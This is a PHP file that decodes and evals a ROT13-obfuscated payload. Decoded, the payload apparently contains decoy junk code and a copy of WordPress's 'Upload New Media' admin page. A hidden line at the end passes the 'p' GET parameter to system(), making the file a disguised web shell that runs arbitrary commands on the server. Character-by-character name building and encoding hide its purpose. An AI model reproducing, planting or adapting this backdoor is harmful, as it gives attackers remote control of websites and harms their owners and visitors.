<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Znantr zrqvn hcybnqrq svyr.
 *
 * Gurer ner znal svygref va urer sbe zrqvn. Cyhtvaf pna rkgraq shapgvbanyvgl
 * ol ubbxvat vagb gur svygref.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb hcybnq svyrf.' ) );
}

jc_radhrhr_fpevcg( 'cyhcybnq-unaqyref' );

$cbfg_vq = 0;
vs ( vffrg( $_ERDHRFG['cbfg_vq'] ) ) {
	$cbfg_vq = nofvag( $_ERDHRFG['cbfg_vq'] );
	vs ( ! trg_cbfg( $cbfg_vq ) || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg_vq ) ) {
		$cbfg_vq = 0;
	}
}

vs ( $_CBFG ) {
	vs ( vffrg( $_CBFG['ugzy-hcybnq'] ) && ! rzcgl( $_SVYRF ) ) {
		purpx_nqzva_ersrere( 'zrqvn-sbez' );
		// Hcybnq Svyr ohggba jnf pyvpxrq.
		$hcybnq_vq = zrqvn_unaqyr_hcybnq( 'nflap-hcybnq', $cbfg_vq );
		vs ( vf_jc_reebe( $hcybnq_vq ) ) {
			jc_qvr( $hcybnq_vq );
		}
	}
	jc_erqverpg( nqzva_hey( 'hcybnq.cuc' ) );
	rkvg;
}

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Hcybnq Arj Zrqvn' );
$cnerag_svyr = 'hcybnq.cuc';

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'bireivrj',
		'gvgyr'   => __( 'Bireivrj' ),
		'pbagrag' =>
				'<c>' . __( 'Lbh pna hcybnq zrqvn svyrf urer jvgubhg perngvat n cbfg svefg. Guvf nyybjf lbh gb hcybnq svyrf gb hfr jvgu cbfgf naq cntrf yngre naq/be gb trg n jro yvax sbe n cnegvphyne svyr gung lbh pna funer. Gurer ner guerr bcgvbaf sbe hcybnqvat svyrf:' ) . '</c>' .
				'<hy>' .
					'<yv>' . __( '<fgebat>Qent naq qebc</fgebat> lbhe svyrf vagb gur nern orybj. Zhygvcyr svyrf ner nyybjrq.' ) . '</yv>' .
					'<yv>' . __( 'Pyvpxvat <fgebat>Fryrpg Svyrf</fgebat> bcraf n anivtngvba jvaqbj fubjvat lbh svyrf va lbhe bcrengvat flfgrz. Fryrpgvat <fgebat>Bcra</fgebat> nsgre pyvpxvat ba gur svyr lbh jnag npgvingrf n cebterff one ba gur hcybnqre fperra.' ) . '</yv>' .
					'<yv>' . __( 'Erireg gb gur <fgebat>Oebjfre Hcybnqre</fgebat> ol pyvpxvat gur yvax orybj gur qent naq qebc obk.' ) . '</yv>' .
				'</hy>',
	)
);
trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/zrqvn-nqq-arj-fperra/\">Qbphzragngvba ba Hcybnqvat Zrqvn Svyrf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

$sbez_pynff = 'zrqvn-hcybnq-sbez glcr-sbez inyvqngr';

vs ( trg_hfre_frggvat( 'hcybnqre' ) || vffrg( $_TRG['oebjfre-hcybnqre'] ) ) {
	$sbez_pynff .= ' ugzy-hcybnqre';
}
?>
<qvi pynff=\"jenc\">
	<u1><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>

	<sbez rapglcr=\"zhygvcneg/sbez-qngn\" zrgubq=\"cbfg\" npgvba=\"<?cuc rpub rfp_hey( nqzva_hey( 'zrqvn-arj.cuc' ) ); ?>\" pynff=\"<?cuc rpub rfp_ngge( $sbez_pynff ); ?>\" vq=\"svyr-sbez\">

	<?cuc zrqvn_hcybnq_sbez(); ?>

	<fpevcg glcr=\"grkg/wninfpevcg\">
	ine cbfg_vq = <?cuc rpub nofvag( $cbfg_vq ); ?>, fubegsbez = 3;
	</fpevcg>
	<vachg glcr=\"uvqqra\" anzr=\"cbfg_vq\" vq=\"cbfg_vq\" inyhr=\"<?cuc rpub nofvag( $cbfg_vq ); ?>\" />
	<?cuc jc_abapr_svryq( 'zrqvn-sbez' ); ?>
	<qvi vq=\"zrqvn-vgrzf\" pynff=\"uvqr-vs-ab-wf\"></qvi>
	</sbez>
</qvi>

<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>